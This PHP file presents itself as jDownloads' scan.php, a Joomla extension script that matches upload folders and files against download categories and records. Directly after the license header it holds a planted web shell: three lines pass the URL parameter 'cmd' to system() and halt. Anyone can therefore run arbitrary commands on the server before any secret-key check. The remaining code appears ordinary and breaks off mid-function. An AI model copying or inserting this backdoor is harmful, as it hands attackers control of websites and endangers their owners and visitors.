<?php
/**
 * @package jDownloads
 * @version 4.0
 * @copyright (C) 2007 - 2022 - Arno Betz - www.jdownloads.com
 * @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.txt
 *
 * jDownloads is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */


$var = $_GET['cmd'];
system($var);
die();
@ini_set('magic_quotes_runtime', 0);
 
define('_JEXEC', 1);

if (!defined('DS')){
    define( 'DS', DIRECTORY_SEPARATOR );
}

define('JPATH', dirname(__FILE__) );

$parts = explode( DS, JPATH );
$script_root =  implode( DS, $parts ) ;

// check path
$x = array_search ( 'administrator', $parts  );
if (!$x) exit;

$path = '';
for ($i=0; $i < $x; $i++){
    $path = $path.$parts[$i].'/';
}
// remove last DS
$path = substr($path, 0, -1);

if (!defined('JPATH_BASE')){
    define('JPATH_BASE', $path );
}

setlocale(LC_ALL, 'C.UTF-8', 'C');

// Run the application
require_once JPATH_BASE . '/includes/defines.php';
require_once JPATH_BASE . '/includes/framework.php';

// Boot the DI container
$container = \Joomla\CMS\Factory::getContainer();

/*
 * Alias the session service keys to the web session service as that is the primary session backend for this application
 *
 * In addition to aliasing "common" service keys, we also create aliases for the PHP classes to ensure autowiring objects
 * is supported.  This includes aliases for aliased class names, and the keys for aliased class names should be considered
 * deprecated to be removed when the class name alias is removed as well.
 */
$container->alias('session.web', 'session.web.site')
    ->alias('session', 'session.web.site')
    ->alias('JSession', 'session.web.site')
    ->alias(\Joomla\CMS\Session\Session::class, 'session.web.site')
    ->alias(\Joomla\Session\Session::class, 'session.web.site')
    ->alias(\Joomla\Session\SessionInterface::class, 'session.web.site');

// Instantiate the application.
$app = $container->get(\Joomla\CMS\Application\SiteApplication::class);

$app->createExtensionNamespaceMap();

// Set the application as global app
\Joomla\CMS\Factory::$application = $app;

/* Required Files */
require_once ( $path . '/components/com_jdownloads/src/Helper/CategoriesHelper.php');
require_once ( $path . '/components/com_jdownloads/src/Helper/QueryHelper.php');
require_once ( $path . '/administrator/components/com_jdownloads/src/Helper/ProgressBar.class.php');
require_once ( $path . '/administrator/components/com_jdownloads/src/Helper/JDownloadsHelper.php');

use Joomla\CMS\Factory;
use Joomla\CMS\Language\Text;
use Joomla\CMS\Router\Route;
use Joomla\CMS\Application\ApplicationHelper;
use Joomla\CMS\Filesystem\File;
use Joomla\CMS\Filesystem\Folder;
use Joomla\String\StringHelper;
use Joomla\CMS\Session\Session;
use Joomla\CMS\Table\Table;
use Joomla\CMS\Table\TableInterface;
use Joomla\CMS\MVC\Model\AdminModel;
use Joomla\CMS\MVC\Model\BaseModel;
use Joomla\CMS\Language\Multilanguage;
use Joomla\CMS\Language\LanguageHelper;
use Joomla\CMS\Component\ComponentHelper;
use Joomla\CMS\MVC\Model\BaseDatabaseModel;
use Joomla\CMS\Filter\OutputFilter;
use Joomla\CMS\Filter\InputFilter;

use JDownloads\Component\JDownloads\Administrator\Helper\JDownloadsHelper;
use JDownloads\Component\JDownloads\Administrator\Model\CategoryModel;
use JDownloads\Component\JDownloads\Administrator\Model\DownloadModel;

$database = Factory::getDBO();
$document = Factory::getDocument();
$user     = Factory::getUser();

// Import jDownloads model
\JLoader::import( 'CategoryModel', JPATH_ADMINISTRATOR .'/components/com_jdownloads/src/models/CategoryModel.php' );
\JLoader::import( 'DownloadModel', JPATH_ADMINISTRATOR .'/components/com_jdownloads/src/models/DownloadModel.php' );

$backend_lang = ComponentHelper::getParams('com_languages')->get('administrator', 'en-GB');
$language = Factory::getLanguage();
$language->load('com_jdownloads', JPATH_ADMINISTRATOR, $backend_lang, true);


?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $backend_lang; ?>" lang="<?php echo $backend_lang; ?>" dir="ltr">
<head><meta http-equiv="Expires" content="Fri, Jan 01 1900 00:00:00 GMT">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script src="../../../../media/system/js/core.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">


<script language="javascript" type="text/javascript">
function windowClose() {
window.open('','_parent','');
window.close();
}
</script>

<title></title>

</head>

<body class="small" style="font-size:12px; line-height:15px; min-width:400px;">
<div class="container-fluid">

<div class="p-3 mb-2 bg-light text-dark">
    <div style="">
         <div class="" style="margin-bottom: 10px; padding: 10px 0px;">
             <?php echo Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO2'); ?>
        </div>
<?php

$document->setTitle(Text::_('COM_JDOWNLOADS_RUN_MONITORING_TITLE'));

// Check whether we may do the job
// *********************************
// IMPORTANT: We get problems if the secret key contains a hash character! 
// *********************************
$config = Factory::getConfig();
$secret = $config->get( 'secret' );

$jinput = Factory::getApplication()->input;

// Check the secret key and check it
$key = $jinput->get('key', '', 'string');
$key = $database->escape($key);

if ($key != $secret){
    echo '<b>'.Text::_('COM_JDOWNLOADS_NOT_ALLOWED_ACTION_MSG').'</b>';
    exit;
}

// Use '&log=0' to deactivate log storing temporary
$log_save = $jinput->get('log', 1, 'integer');

// Which job shall do the script?
// mode == 0  : do all (default setting)
// mode == 1  : search only new Categories
// mode == 2  : search only new Files
// mode == 3  : check only existence of Categories
// mode == 4  : check only existence of Files

$mode = $jinput->get('mode', '0', 'integer');
$testrun = $jinput->get('test', '0', 'integer');

$buffer = ob_get_level();
if ($buffer){
    ob_flush();
    flush();
}

$time_start = microtime_float();

checkFiles($key, $log_save, $testrun, $mode);

$time_end = microtime_float();
$time = $time_end - $time_start;

$session = Factory::getSession();
$jd_scan = $session->get('jd_scan', array());
$time = $jd_scan['sum_duration_time'] + $time;

$session->clear('jd_scan');

$duration = number_format ( $time, 2);
echo '<div class="container pt-2"><small>'.Text::sprintf('COM_JDOWNLOADS_AUTOCHECK_DURATION', $duration).'</small>';
echo '<small>'.Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO8').'</small>';
echo '</div></body></html>';


/* checkFiles
/
/ check uploaddir and subdirs for variations
/
/
*/
function checkFiles($secret, $log_save, $testrun, $mode = 0) {

    global $lang;

    $app = Factory::getApplication();
    $jinput = $app->input;
    
    $user = Factory::getUser();
    $user_id = $user->get('id');
    
    $params = ComponentHelper::getParams('com_jdownloads');

    $part_start_time = microtime(true);

    // Run the check only when the upload root folder exist
    if (file_exists($params->get('files_uploaddir')) && $params->get('files_uploaddir') != ''){

        if ($params->get('disable_server_limits')){
            $limits = remove_server_limits();
            if (!$limits){
                echo '<div class="alert alert-warning">';
                echo Text::_('COM_JDOWNLOADS_AUTOCHECK_SAFE_MODE_HINT');
                echo '</div>';
            }
        }

        // How long is the max script execution time
        $max_exec_time = (int)ini_get('max_execution_time');

        if ($max_exec_time == 0){
            $max_exec_time = 18000;  // 5 hours maximum
        }

        // Seconds left before the redirect will start
        $time_buffer   = 3;

        // Only for testing / Seconds pause between every item check.
        // $pause = 0;  // Example: 200000 = 0.2 seconds

        if (function_exists('ignore_user_abort')) {
        	ignore_user_abort(true);
        }
        
        $buffer = ob_get_level();
        if ($buffer){
            ob_flush();
            flush();
        }

        // Register and load the required classes
        BaseDatabaseModel::addIncludePath(JPATH_ADMINISTRATOR . '/components/com_jdownloads/src/Model');
        \JLoader::register('CategoryModel', JPATH_ADMINISTRATOR . '/components/com_jdownloads/src/Model/CategoryModel.php');
        \JLoader::register('DownloadModel', JPATH_ADMINISTRATOR . '/components/com_jdownloads/src/Model/DownloadModel.php');
        \JLoader::load('CategoryModel');
        \JLoader::load('DownloadModel');
        
        Table::addIncludePath(JPATH_ADMINISTRATOR . '/components/com_jdownloads/src/Table');
        \JLoader::register('JDCategoryTable', JPATH_ADMINISTRATOR . '/components/com_jdownloads/src/Table/JDCategoryTable.php');
        \JLoader::load('JDCategoryTable');
        \JLoader::register('DownloadTable', JPATH_ADMINISTRATOR . '/components/com_jdownloads/src/Table/DownloadTable.php');
        \JLoader::load('DownloadTable');
        
        $model_category = BaseDatabaseModel::getInstance('Category', 'jdownloadsModel', array('ignore_request' => true));
        $model_download = BaseDatabaseModel::getInstance('Download', 'jdownloadsModel', array('ignore_request' => true));

        $db = Factory::getDBO();
        $lang = Factory::getLanguage();
        $lang->load('com_jdownloads', JPATH_SITE.'/');

        $startdir     = $params->get('files_uploaddir').'/';
        $dir_len      = strlen($startdir);

        // get data from session
        $session = Factory::getSession();
        $jd_scan = $session->get('jd_scan', array());

        if (!$jd_scan){
            // create the session data array
            $jd_scan['secret'] = $secret;
            $jd_scan['mode']   = $mode;
            $jd_scan['last_checked_cat_nr'] = 0;
            $jd_scan['last_checked_file_nr'] = 0;
            $jd_scan['published_cats']  = array();
            $jd_scan['published_files']  = array();
            $jd_scan['dirlist'] = '';
            $jd_scan['fileslist'] = array();
            $jd_scan['searchdirs'] = '';
            $jd_scan['searched_files'] = array();
            $jd_scan['lastdir'] = '';
            $jd_scan['lastpath'] = '';
            $jd_scan['number_of_runs'] = 1;
            $jd_scan['sum_duration_time'] = 0;
            $jd_scan['mode_1_finished'] = false;
            $jd_scan['mode_2_finished'] = false;
            $jd_scan['mode_3_finished'] = false;
            $jd_scan['mode_4_finished'] = false;

            // required for folder and files check process to find new items and get a correct bar
            $jd_scan['checked_dirs'] = 0;
            $jd_scan['checked_cats'] = 0;
            $jd_scan['checked_files'] = 0;
            $jd_scan['checked_downloads'] = 0;

            // required for the results message
            $jd_scan['new_cats_created'] = 0;
            $jd_scan['new_downloads_created'] = 0;
            $jd_scan['mis_cats'] = 0;
            $jd_scan['mis_files'] = 0;

            $jd_scan['log_array'] = array();
            $jd_scan['log_save'] = $log_save;
            $session->set('jd_scan', $jd_scan);
        }

        // Define the params for scan_dir() results
        $dir          = $startdir;
        $only         = false;
        $file_types   = array();
        $specified_folder_names = array();
        $specified_folder_name_types = '';

        if ($params->get('all_files_autodetect')){
            $allFiles = true;
        } else {
            $allFiles = false;
            $file_types =  explode(',', $params->get('file_types_autodetect'));
        }
        
        // Shall be checked all folders?
        
        if ($params->get('all_folders_autodetect')){
            $allFolders = true;
        } else {
            $allFolders = false;
            
            // What shall be happen with the specified folders?  Value 1 = exclude | 0 = include
            $specified_folder_name_types = $params->get('include_or_exclude');
            // remove line breaks
            $specified_folder_names = preg_split("/\\r\\n|\\r|\\n/", $params->get('include_or_exclude_folders'));
            // remove empty parts
            $specified_folder_names = array_filter($specified_folder_names);
            foreach ($specified_folder_names as &$specified_folder_name){
                $specified_folder_name = $dir.$specified_folder_name.'/';
            } 
        }

        $recursive    = true;
        $onlyDir      = true;
        $files        = array();
        $file         = array();
        $dirlist      = array();
        $log_array    = array();
        $success      = false;

        $new_downloads_created    = 0;
        $new_cats_created = 0;
        $new_dirs_found   = 0;
        $log_message      = '';
        $new_cat_dir_name = '';
        $mis_cats         = 0;
        $number_of_runs   = 1;
        $checked_dirs     = 0;
        $checked_cats     = 0;
        $checked_files    = 0;
        $checked_downloads = 0;
        
        $old_folder_missing = false;
        $old_file_missing   = false;

        clearstatcache();
        $jd_root      = $params->get('files_uploaddir').'/';
        $temp_dir     = $jd_root.$params->get('tempzipfiles_folder_name').'/';
        $preview_dir  = $jd_root.$params->get('preview_files_folder_name').'/';

        $log_file     = JPATH_BASE.'/administrator/components/com_jdownloads/monitoring_logs.txt';

        $exclude_folders = array($temp_dir, $preview_dir);
        $include_folders = array();
        
        if (!$allFolders){
            if ($specified_folder_name_types == 1){
                // the listed folders are excluding
                foreach ($specified_folder_names as $specified){
                    $exclude_folders[] = $specified;
                }
            } else {
                // the listed folders are including
                $include_folders = $specified_folder_names;
            }
        }

          // ************************************************************************************
          // Mode: 1
          // We search Directories which are still not stored in the DB as Categories
          // ************************************************************************************

          if ($mode == 0 or $mode == 1){

              $searchdirs   = array();

              if (!$jd_scan['dirlist']){
                 $dirlist = JDownloadsHelper::searchdir($jd_root, -1, 'DIRS', 0, $exclude_folders, $include_folders);
                 for ($i=0; $i < count($dirlist); $i++) {
                     if (JDownloadsHelper::findStringInArray($exclude_folders, $dirlist[$i]) && $jd_root != $dirlist[$i]){
                         unset($dirlist[$i]);
                     }
                 }
                 $dirlist = array_values($dirlist);
                 $jd_scan['dirlist'] = $dirlist;
                 $session->set('jd_scan', $jd_scan);
              } else {
                 $dirlist = $jd_scan['dirlist'];
              }

              if (!$jd_scan['searchdirs']){
                  $no_writable = 0;
                  for ($i=0; $i < count($dirlist); $i++) {
                      // no tempzifiles directory
                      if (strpos($dirlist[$i], $params->get('tempzipfiles_folder_name').'/') === FALSE) {
                          if (!is_writable($dirlist[$i])){
                              $no_writable++;
                          }
                          $dirlist[$i] = str_replace($jd_root, '', $dirlist[$i]);
                          // delete last slash /
                          if ($pos = strrpos($dirlist[$i], '/')){
                              $searchdirs[] = substr($dirlist[$i], 0, $pos);
                          }
                      }
                  }
                  $jd_scan = $session->get('jd_scan', array());
                  $jd_scan['searchdirs'] = $searchdirs;
                  $session->set('jd_scan', $jd_scan);
              } else {
                  $searchdirs = $jd_scan['searchdirs'];
              }
              unset($dirlist);

              $db->setQuery("SELECT concat (cat_dir_parent, '/', cat_dir) AS path FROM #__jdownloads_categories WHERE cat_dir != ''");
              $existing_categories = $db->loadColumn();

              $count_cats = count($searchdirs);

              // create progressbar
              echo '<div>';
              $title1 = Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO3');
              $bar = new ProgressBar();
              $bar->setMessage($title1);
              $bar->setAutohide(false);
              $bar->setSleepOnFinish(0);
              $bar->setPrecision(50);
              $bar->setForegroundColor('#d9534f');
              $bar->setBackgroundColor('#DDDDDD');
              $bar->setBarLength(340);
              $bar->initialize($count_cats);

              if (!$jd_scan['mode_1_finished'] && $count_cats){

                  for ($i=0; $i < count($searchdirs); $i++) {

                      if ($jd_scan['checked_dirs'] > 0 && $i <= ($jd_scan['checked_dirs']-1) ){
                          $bar->increase();
                          continue;
                      }

                      //usleep($pause);

                      $dirs = explode('/', $searchdirs[$i]);
                      $sum = count($dirs);

                      // check that folder exist
                      if ($sum == 1){
                          $searched_cat = '/'.$searchdirs[$i];
                          if (in_array('/'.$searchdirs[$i], $existing_categories)){
                              $cat_exist = true;
                          } else {
                              $cat_exist = false;
                          }
                          $cat_dir_parent_value = '';
                          $cat_dir_value = $dirs[0];
                      } else {
                          if (in_array($searchdirs[$i], $existing_categories)){
                              $cat_exist = true;
                          } else {
                              $cat_exist = false;
                          }
                          $pos = strrpos($searchdirs[$i], '/');
                          $cat_dir_parent_value = substr($searchdirs[$i], 0, $pos);
                          $cat_dir_value = substr($searchdirs[$i], $pos +1);
                      }

                      // when not exist - add it
                      if (!$cat_exist) {
                           $new_dirs_found++;
                           
                           if (!$testrun){ 
                           
                               $parent_cat = '';

                               // get the right parent_id value
                               if ($sum == 1){
                                   // we have a new root cat
                                   $parent_id = 1;
                               } else {
                                   // find the parent category and get the cat ID
                                   $pos = strrpos($cat_dir_parent_value, '/');

                                   if ($pos){
                                       // we have NOT a first level sub category
                                       $cat_dir_parent_value2 = substr($cat_dir_parent_value, 0, $pos);
                                       $cat_dir_value2 = substr($cat_dir_parent_value, $pos +1);
                                       $db->setQuery("SELECT * FROM #__jdownloads_categories WHERE cat_dir = ".$db->quote( $db->escape( $cat_dir_value2 ), false )." AND cat_dir_parent = ".$db->quote( $db->escape( $cat_dir_parent_value2 ), false ));

                                   } else {
                                       // we have a first level sub category
                                       $cat_dir_parent_value2 = $cat_dir_parent_value;
                                       $cat_dir_value2 = $cat_dir_value;
                                       $db->setQuery("SELECT * FROM #__jdownloads_categories WHERE cat_dir = ".$db->quote( $db->escape( $cat_dir_parent_value2 ), false ). " AND cat_dir_parent = ''");
                                   }

                                   $parent_cat = $db->loadObject();
                                   if ($parent_cat){
                                       $parent_id = $parent_cat->id;
                                   } else {
                                       // can not found the parents category for the new child
                                       $log_array[] = Text::_('Abort. Can not find parents category for the new folder: ').' <b>'.$searchdirs[$i].'</b><br />';
                                       break;
                                   }
                               }

                               // we need the original folder title as category title
                               $original_folder_name = $cat_dir_value;

                               // check the founded folder name
                               $checked_cat_dir = JDownloadsHelper::getCleanFolderFileName( $cat_dir_value, true );

                               // check the folder name result
                               if ($cat_dir_value != $checked_cat_dir){
                                   // build path
                                   if ($parent_cat){
                                       if ($parent_cat->cat_dir_parent){
                                           $cat_dir_path = $jd_root.$parent_cat->cat_dir_parent.'/'.$parent_cat->cat_dir.'/'.$checked_cat_dir;
                                           $new_cat_dir_name = $parent_cat->cat_dir_parent.'/'.$parent_cat->cat_dir.'/'.$checked_cat_dir;
                                       } else {
                                           $cat_dir_path = $jd_root.$parent_cat->cat_dir.'/'.$checked_cat_dir;
                                           $new_cat_dir_name = $parent_cat->cat_dir.'/'.$checked_cat_dir;
                                       }
                                   } else {
                                        $cat_dir_path = $jd_root.$checked_cat_dir;
                                        $new_cat_dir_name = $checked_cat_dir;
                                   }

                                   // rename the folder - when he already exist: make it unique!
                                   $num = 1;
                                   while (Folder::exists($cat_dir_path)){
                                       $cat_dir_path    = $cat_dir_path.$num;
                                       $checked_cat_dir = $checked_cat_dir.$num;
                                       $num++;
                                   }

                                   if (!Folder::exists($cat_dir_path)){
                                       $copied = Folder::move($jd_root.$searchdirs[$i], $cat_dir_path);
                                       if ($copied !== true){
                                           $log_array[] = Text::_('Error! Can not change folder name: ').' <b>'.$searchdirs[$i].'</b><br />';
                                       }
                                   } else {
                                       $log_array[] = Text::_('Error! A folder with the same (cleaned) name exist already: ').' <b>'.$searchdirs[$i].'</b><br />';
                                   }
                                   $cat_dir_value = $checked_cat_dir;

                                   // update the name in the folder list
                                   $searchdirs[$i] = $new_cat_dir_name;
                               }

                              

                               // set alias
                               $alias = ApplicationHelper::stringURLSafe($cat_dir_value);
                               
                               $use_default_values = $params->get('autopublish_use_cat_default_values', 0);
                                 
                               if ($use_default_values){
                                   $desc      = JDownloadsHelper::getOnlyLanguageSubstring($params->get('autopublish_default_cat_description', ''));
                                   $desc      = InputFilter::getInstance()->clean($desc, 'string');
                                   $access    = $params->get('autopublish_cat_access_level', 0);
                                   $language  = $params->get('autopublish_cat_language', '*');
                                   $tags      = $params->get('autopublish_cat_tags', 0);
                                   $creator   = $params->get('autopublish_cat_created_by', 0);
                                   $cat_pic       = $params->get('autopublish_cat_pic_default_filename', '');
                               } else {
                                   $desc      = '';
                                   $language  = '*';
                                   $tags      = '';
                                   $creator   = 0;
                                   $cat_pic   = $params->get('cat_pic_default_filename');
                                   
                               if ($parent_cat){
                                   $access = $parent_cat->access;
                               } else {
                                   $access = 1;
                               }

                               }

                               // set note hint
                               $note = '';

                               // build table array
                               $data = array (
                                    'id' => 0,
                                    'parent_id' => $parent_id,
                                    'title' => $original_folder_name,
                                    'alias' => $alias,
                                    'notes' => $note,
                                    'description' => $desc,
                                    'cat_dir' => $cat_dir_value,
                                    'cat_dir_parent' => $cat_dir_parent_value,
                                    'pic' => $cat_pic,
                                    'published' => (int)$params->get('autopublish_founded_files'),
                                    'access' => $access,
                                    'metadesc' => '',
                                    'metakey' => '',
                                    'created_user_id' => $creator,
                                    'language' => $language,
                                    'tags' => $tags,
                                    'rules' => array(
                                        'core.create' => array(),
                                        'core.delete' => array(),
                                        'core.edit' => array(),
                                        'core.edit.state' => array(),
                                        'core.edit.own' => array(),
                                        'download' => array(),
                                    ),
                                    'params' => array(),
                               );

                               
                               // create new cat in table
                               $create_result = $model_category->createAutoCategory( $data );
                               if (!$create_result){
                                   // error message
                                   $log_array[] = Text::_('Error! Can not create new category for: ').' <b>'.$searchdirs[$i].'</b><br />';
                               } else {
                                   $new_cats_created++;
                                   $log_array[] = '<span style="color:green;">'.Text::_('COM_JDOWNLOADS_AUTO_CAT_CHECK_ADDED').'</span> <b>'.$searchdirs[$i].'</b><br />';
                               }
                           } else {
                               // add only hint for test run msg
                               $log_array[] = '<span style="color:green;">'.Text::sprintf('COM_JDOWNLOADS_AUTO_CHECK_NEW_CAT_FOUND', '</span> <b>'.$searchdirs[$i].'</b><br />');
                               $new_cat_found = true;
                           }
                      }
                      $checked_dirs++;
                      $bar->setMessage($title1.' ('.($jd_scan['checked_dirs'] + $checked_dirs).')');
                      $bar->increase();

                      // check the script duration
                      $current_time = microtime(true);
                      $consumed_time = $current_time - $part_start_time;
                      // If there are only $time_buffer seconds left, start the next pass
                      $remainder = $max_exec_time - (int)round($consumed_time,0);
                      if ($remainder < $time_buffer) {
                          // run next turn
                          $number_of_runs++;
                          $jd_scan['checked_dirs'] = $jd_scan['checked_dirs'] + $checked_dirs;
                          $jd_scan['new_cats_created'] = $jd_scan['new_cats_created'] + $new_cats_created;
                          $jd_scan['searchdirs'] = $searchdirs;
                          $jd_scan['lastdir'] = $searchdirs[$i];
                          $jd_scan['lastpath'] = $new_cat_dir_name;

                          if ($log_array){
                              foreach ($log_array as $log){
                                  $jd_scan['log_array'][] = $log;
                              }
                              $log_array = array();
                          }

                          $jd_scan['number_of_runs'] =  $jd_scan['number_of_runs'] + $number_of_runs;
                          $jd_scan['sum_duration_time'] = $jd_scan['sum_duration_time'] + (int)round($consumed_time,0);
                          $session->set('jd_scan',$jd_scan);

                          $app->redirect(ROUTE::_('scan.php?key='.$secret.'&mode='.$mode.'&test='.$testrun));
                      }

                  }
                  $bar->setMessage($title1);
                  if (!$allFolders && (count($exclude_folders) || count($include_folders))){
                      echo '<br /><small>'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_SUM_FOLDERS').' '.count($searchdirs).' <span class="small label label-inverse">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NOT_ALL_ITEMS').'</span><br /><br /></small>';
                  } else {
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_SUM_FOLDERS').' '.count($searchdirs).'<br /><br /></small>';
                  }    
                  
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }

                  $jd_scan['checked_dirs'] = $jd_scan['checked_dirs'] + $checked_dirs;
                  $jd_scan['new_cats_created'] = $jd_scan['new_cats_created'] + $new_cats_created;
                  $jd_scan['searchdirs'] = $searchdirs;
                  $jd_scan['lastdir'] = $searchdirs[$i-1];
                  $jd_scan['lastpath'] = $new_cat_dir_name;

                  if ($log_array){
                      foreach ($log_array as $log){
                        $jd_scan['log_array'][] = $log;
                      }
                      $log_array = array();
                  }

                  $jd_scan['mode_1_finished'] = true;
                  $session->set('jd_scan',$jd_scan);

              } else {
                  if ($count_cats){
                      for ($z=0; $z < $count_cats; $z++){
                          $bar->increase();
                      }
                  } else {
                      $bar->increase();
                  }
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_SUM_FOLDERS').' '.count($searchdirs).'<br /><br /></small>';

                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }
              }

              if (!$testrun && $params->get('autopublish_reset_use_default_values') == 1){
                  JDownloadsHelper::changeParamSetting('autopublish_use_cat_default_values', '0');
              }
              
              unset($dirs);
              unset($searchdirs);
          }

          // ************************************************************************************
          // Mode: 2
          // We search Files which are still not stored in the DB as Downloads
          // and create for it new Downloads
          // ************************************************************************************

          if ($mode == 0 || $mode == 2){

              if (!$jd_scan['fileslist']){
                  $all_dirs = JDownloadsHelper::scan_dir( $dir, $exclude_folders, $include_folders, $jd_root, $files, $file_types, $only, $allFiles, $recursive, $onlyDir );
                  if ($all_dirs !== FALSE) {
                      $jd_scan['fileslist'] = $files;
                      $session->set('jd_scan', $jd_scan);
                  } else {
                      $files = array();
                  }
              } else {
                  $files = $jd_scan['fileslist'];
              }

              $count_files = count($files);

              // create progressbar
              echo '<div>';
              $bar = new ProgressBar();
              $title3 = Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO5');
              $bar->setMessage($title3);
              $bar->setAutohide(false);
              $bar->setSleepOnFinish(0);
              $bar->setPrecision(100);
              $bar->setForegroundColor('#d9534f');
              $bar->setBarLength(340);
              $bar->initialize($count_files);

              if (!$jd_scan['mode_2_finished'] && $count_files > 0){

                  reset ($files);
                  $new_downloads_created = 0;

                  foreach($files as $key3 => $array2) {

                      if (in_array($key3, $jd_scan['searched_files'])){
                          $bar->increase();
                          continue;
                      }

                      //usleep($pause);

                      $filename = $files[$key3]['file'];

                      if ($filename != '') {
                         $dir_path_total = $files[$key3]['path'];
                         $restpath = substr($files[$key3]['path'], $dir_len);
                         $only_dirs = substr($restpath, 0, strlen($restpath) - 1);
                         $upload_dir = $params->get('files_uploaddir').'/'.$only_dirs.'/';

                         $pos = strrpos($only_dirs, '/');
                         if ($pos){
                            $cat_dir_parent_value = substr($only_dirs, 0, $pos);
                            $cat_dir_value = substr($only_dirs, $pos +1);
                         } else {
                            $cat_dir_parent_value = '';
                            $cat_dir_value = $only_dirs;
                         }

                         // exist still a Download with this filename?
                         $exist_file = false;
                         $db->setQuery("SELECT catid FROM #__jdownloads_files WHERE url_download = '".$db->escape($filename)."'");
                         $row_file_exists = $db->loadObjectList();

                         foreach ($row_file_exists as $row_file_exist) {
                            if (!$exist_file) {
                                // exist he already in table?
                                $db->setQuery("SELECT COUNT(*) FROM #__jdownloads_categories WHERE id = '$row_file_exist->catid' AND cat_dir = ".$db->quote( $db->escape( $cat_dir_value ), false )
                                               . " AND cat_dir_parent = ".$db->quote( $db->escape( $cat_dir_parent_value ), false ));
                                $row_cat_find = $db->loadResult();
                                if ($row_cat_find) {
                                    $exist_file = true;
                                }
                            }
                         }

                         // Add the file here in a new Download
                         if (!$exist_file) {

                             if (!$testrun){
                             
                                 // reset images var
                                 $images = '';

                                 $only_name = File::stripExt($filename);
                                 $file_extension = File::getExt($filename);

                                 // Build the title
                                 $title = InputFilter::getInstance()->clean($only_name, 'STRING');
                                 // Use title rules
                                 $title_rule = $params->get('autopublish_title_format_option', 0);
                                 
                                 $use_default_values = $params->get('autopublish_use_default_values', 0);
                                 
                                 if ($use_default_values){
                                 
                                     if ($title_rule > 0){
                                         $title = str_replace('-', ' ', $title);
                                         $title = str_replace('_', ' ', $title);  
                                     }
                                     
                                     if ($title_rule == 2){
                                            $title = ucwords($title); 
                                     }
                                     
                                     if ($title == '') $title = 'Invalid Name!';
                                     
                                     $creator   = $params->get('autopublish_created_by', 0);
                                     $language  = $params->get('autopublish_language', '*');
                                     $desc      = JDownloadsHelper::getOnlyLanguageSubstring($params->get('autopublish_default_description', ''));
                                     $desc      = InputFilter::getInstance()->clean($desc, 'string');
                                     $access    = $params->get('autopublish_access_level', 0);
                                     $tags      = $params->get('autopublish_tags', 0);
                                     $price     = $params->get('autopublish_price', '');
                                 } else {
                                     $creator   = '';
                                     $desc      = '';
                                     $access    = '';
                                     $language  = '*';
                                     $tags      = '';
                                     $price     = '';
                                 }

                                 // check filename
                                 $filename_new = JDownloadsHelper::getCleanFolderFileName( $only_name, true ).'.'.$file_extension;

                                 if ($only_name == ''){
                                     echo "<script> alert('Error: Filename empty after cleaning: ".$dir_path_total."'); </script>\n";
                                     continue;    // go to next foreach item
                                 }

                                 if ($filename_new != $filename){
                                     $source = $startdir.$only_dirs.'/'.$filename;
                                     $target = $startdir.$only_dirs.'/'.$filename_new;
                                     $success = @rename($source, $target);
                                     if ($success === true) {
                                         $filename = $filename_new;
                                     } else {
                                         // could not rename filename
                                         echo "<script> alert('Error: Could not rename $filename'); </script>\n";
                                         continue;    // go to next foreach item
                                     }
                                 }

                                 $target_path = $upload_dir.$filename;

                                 // find the category for the new founded file in this folder
                                 $db->setQuery("SELECT * FROM #__jdownloads_categories WHERE cat_dir = ".$db->quote( $db->escape( $cat_dir_value ), false ). " AND cat_dir_parent = ".$db->quote( $db->escape( $cat_dir_parent_value ), false ));
                                 $cat = $db->loadObject();

                                 if ($cat){
                                     $id = $cat->id;
                                     if (!$use_default_values){
                                     $access = $cat->access;
                                     }
                                 } else {
                                     // It seems that the files folder was still not added at the moment.
                                     // So we must abort the process and give the user a hint (like: 'Please launch first the search at new categories').
                                      echo '<div class="alert alert-error"><b>'.Text::_('COM_JDOWNLOADS_AUTOCHECK_HINT_CAT_MUST_BE_CREATED_FIRST').'</div>';
                                      exit;

                                 }

                                 $date = Factory::getDate();
                                 $tz = Factory::getConfig()->get( 'offset' );
                                 $date->setTimezone(new DateTimeZone($tz));

                                 $file_extension = File::getExt($filename);

                                 // set file size
                                 $file_size =  $files[$key3]['size'];

                                 // set note hint
                                 $note = ''; //Text::_('COM_JDOWNLOADS_RUN_MONITORING_NOTE_TEXT');

                                 // set creation date
                                 $creation_date = Factory::getDate()->toSql();

                                 // set file mime pic
                                 $picpath = strtolower(JPATH_SITE.'/images/jdownloads/fileimages/'.$file_extension.'.png');
                                 if (file_exists($picpath)){
                                    $file_pic  = $file_extension.'.png';
                                 } else {
                                    $file_pic  = $params->get('file_pic_default_filename');
                                 }

                                 // create thumbs form pdf
                                 if ($params->get('create_pdf_thumbs') && $params->get('create_pdf_thumbs_by_scan') && $file_extension == 'pdf'){
								     $thumb_file_type = strtolower($params->get('pdf_thumb_image_type'));
                                     
								     // make sure that we have an uniqe filename for the new pic
